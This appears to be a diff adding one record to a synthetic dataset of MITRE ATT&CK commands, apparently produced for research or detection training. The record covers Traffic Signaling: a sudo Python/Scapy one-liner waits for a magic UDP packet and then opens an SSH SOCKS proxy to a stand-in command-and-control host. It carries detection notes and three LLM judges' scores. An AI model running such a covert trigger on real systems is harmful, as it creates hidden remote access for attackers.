@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1205",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "sudo python3 -c \"from scapy.all import sniff; sniff(filter='udp and port 54321 and udp[8:4]=0xdeadbeef', count=1); import os; os.system('ssh -fN -D 1080 user@c2.example')\"",
+  "explanation": "Uses Scapy with root privileges to sniff for a UDP packet to port 54321 whose first 4 payload bytes equal 0xDEADBEEF. Upon seeing the magic packet, it launches an SSH SOCKS proxy (-D 1080) for covert comms. Detection: monitor for scapy/sniff usage by users; alert on UDP payload signatures; detect unexpected local SSH SOCKS proxies.",
+  "rationale_steps": [
+    "Wait for a magic UDP payload that serves as a covert trigger (requires sudo for raw capture).",
+    "Upon detection, start an SSH dynamic SOCKS proxy.",
+    "Use the proxy for further command and control.",
+    "Detect via process monitoring for scapy and anomalous SSH with -D flags."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1205-9e1e4684-ec5fc131",
+  "source_prompt_hash": "9e1e4684",
+  "timestamp_utc": "2025-09-30T05:53:05.592837Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Balanced quotes and parentheses with valid Python -c statements, a correctly quoted BPF filter, and valid ssh flags.",
+        "semantic_score": 5,
+        "semantic_justification": "It passively waits for a specific UDP magic packet and then launches an SSH SOCKS proxy, aligning with T1205 traffic signaling to trigger C2 given sudo and Scapy/pcap availability.",
+        "combined_score": 5.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T13:12:15.055079Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, proper Python syntax within the command, correct use of semicolons for command separation, and valid flags for both the Python and SSH commands.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly implements the Traffic Signaling technique by using Scapy to sniff for a specific UDP packet with a magic value (0xDEADBEEF) as a trigger to establish a covert SSH SOCKS proxy for command and control.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T13:12:18.155735Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The Python script is perfectly well-formed with balanced quotes, valid Scapy filter syntax, and a correctly embedded shell command for execution.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly achieves the claimed intent of traffic signaling by using Scapy to trigger an SSH SOCKS proxy upon receipt of a specific UDP magic packet, directly aligning with T1205.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T13:12:27.365585Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 5.0,
+    "llm_average_score": 5.0,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
